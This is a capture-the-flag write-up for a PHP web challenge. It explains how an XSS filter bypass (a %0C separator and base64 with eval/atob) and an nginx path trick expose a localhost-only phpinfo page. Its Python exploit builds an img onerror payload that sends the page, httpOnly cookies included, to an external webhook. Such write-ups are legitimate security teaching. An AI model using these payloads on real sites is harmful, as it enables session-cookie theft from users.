+++
title = 'Hello'
tags = [
  "Web",
  "Php",
  "Xss",
  "140 points",
  "141 solves",
  "Abdelhameed Ghazy",
]
date = 2024-08-18T12:58:59+02:00
draft = true
+++

<h1 style='text-decoration: underline;text-decoration-color: #9e8c6c;font-size: 3em;'>Hello</h1>

**Description**: Just to warm you up for the next Fight :"D

## Introduction

Then we have an apparently empty page, but where we can via a ?name= parameter enter some text, the page will then respond with hello, {text entered}

The with an ngix server

Moreover, ctf in general gives us the possibility of using an admin bot where the flag is set in the cookies

## Source

```php
# filename: index.py

<?php


function Enhanced_Trim($inp) {
    $trimmed = array("\r", "\n", "\t", "/", " ");
    return str_replace($trimmed, "", $inp);
}


if(isset($_GET['name']))
{
    $name=substr($_GET['name'],0,23);
    echo "Hello, ".Enhanced_Trim($_GET['name']);
}

?>

```

```php
# filename: info.py

<?php
phpinfo();
?>

```

```ngix
# filename: ngix.conf


user www-data;
worker_processes 1;

events {
worker_connections 1024;
}

http {
include /etc/nginx/mime.types;
default_type application/octet-stream;

    sendfile        on;
    keepalive_timeout  65;

    server {
        listen       80;
        server_name  localhost;

        location / {
            root   /usr/share/nginx/html;
            index  index.php index.html index.htm;
        }

        location = /info.php {
        allow 127.0.0.1;
        deny all;
        }

        location ~ \.php$ {
        root           /usr/share/nginx/html;
        fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
        include fastcgi_params;
        fastcgi_pass unix:/var/run/php/php8.2-fpm.sock;
        }

    }

}
```

As you can see, there are 3 main files to focus on

1. The first is the index file where we see how the page works and the filters used, in particular the fact that we cannot use /, spaces, etc.
2. An info.php file which is definitely suspect and not normally needed but probably has a purpose in the challange
3. And the ngix configuration file, which is very important because it is the one that prevents us from accessing info.php in a simple way.

## Solution

This challange is very nice in my opinion neither too difficult nor too complex, it mixes different vulnerabilities in a really nice way...

The first one is designed to catch the cookie because in the configuration of bot.js we see that the cookie is set to httpOnly which makes the extraction much more difficult but looking a little online we understand why it is present that info.php in fact the function phpinfo() as well as show several parameters of the php configuration and other information also shows the cookies present at that time ... SO HERE'S THE TARGET AND GET THE OWN BOT TO OPEN /info.php

But how can we do this?

The first step is to be able to inject a payload that opens info.php and sends the file somewhere

The only entrypoint we see is `?name=` which is not sanitized in the best way, in fact by making `<h1>BTC` (we make sure that the tag closes itself otherwise the final / will filter out) we notice that the h1 is rendered and this is ' a first sign that we can do an xss even if we note that the classic `<script>alert('ByteTheCookies')` doesn't work, probably some php configuration or some police, so the xss would be slightly more complex but we can exploit the onerror parameter of img with some changes in fact if we insert a classic `<img src='invalid.jpg' onerror="alert('ByteTheCookies')"` It will be sanitized by removing the spaces and will not allow the xss to be executed. But we can bypass this very easily, in fact by looking for some bypasses on HackTricks and trying some of them we notice that the payload `<img%0Csrc="invalid.jpg"onerror="alert('ByteTheCookies')"` works

GOOD we managed to bypass the xss now we have to create the payload we need...

In particular I used: `fetch('{target}').then(r=>r.text()).then(t=>{fetch('{url_webhook}',{method:'POST',body:(f=new FormData(),f.append('file',new Blob([t],{type:'text/plain'}),'phpinfo.txt'),f)});console.log('Data sended');});`

This payload makes a first request and sends the content to a webhook in the form of a file so it's all very simple

However, the problem arises in fact if this payload is sent it will not work because the URLs contain / which will be removed and this is a significant problem

To bypass this, however, we can use a very simple trick, We just need to previously encode the payload in base64 and use an `eval(atob(payload))`

By sending this in the url we can make the payload work without problems. FINISHED RIGHT?

No, because analyzing the nginx configuration we notice a significant detail

```ngix
location = /info.php {
        allow 127.0.0.1;
        deny all;
        }
```

As we see /info.php can only be reached from localhost and spoiler our bot is not on the same server as the challenge

This may seem like a major obstacle but in reality by searching the internet for ngix bypasses we can find something very [interesting](https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass#php-fpm)

As we see on hacktricks we notice that if we insert an accessible page immediately after a non-accessible page in the ngix url it redirects us correctly to the non-accessible page and this is exactly what we need

So the final solution becomes:

```python
# filename: exploit.py

import base64

url = "http://idek-hello.chal.idek.team:1337/"
url_webhook = 'https://webhook.site/8b10c871-1e0b-4050-8
2e3-e102a73da54e'
url_admin = 'https://admin-bot.idek.team/idek-hello'

def main():

    # Bypass hacktrics https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass#php-fpm
    target = "http://idek-hello.chal.idek.team:1337/info.php/index.php"

    exploit = ("fetch('" + target + "').then(r=>r.text()).then(t=>{fetch('"+url_webhook+"',{method:'POST',body:(f=new FormData(),f.append('file',new Blob([t],{type:'text/plain'}),'phpinfo.txt'),f)});console.log('Dati inviati al webhook');});").encode()

    main_payload = base64.b64encode(exploit).decode()

    payload = """<img%0Csrc="invalid.jpg"onerror="eval(atob('""" + main_payload + """'));">""" # Bypassed with %0C

    final_url_whith_exploit = f"{url}?name={payload}"

    print(f"Final url: {final_url_whith_exploit}") # Send the url on the admin bot and download the file on webhook.site

    print(f"Now copy and paste the url on the admin bot: {url_admin} and send the requeste to the admin bot, after this go to the webhook.site and download the file and search the flag in the file")

if __name__ == '__main__':
  main()

```

```stdout
$ flag: idek{Ghazy_N3gm_Elbalad}
```

<p align='right'>Author: akiidjk </p>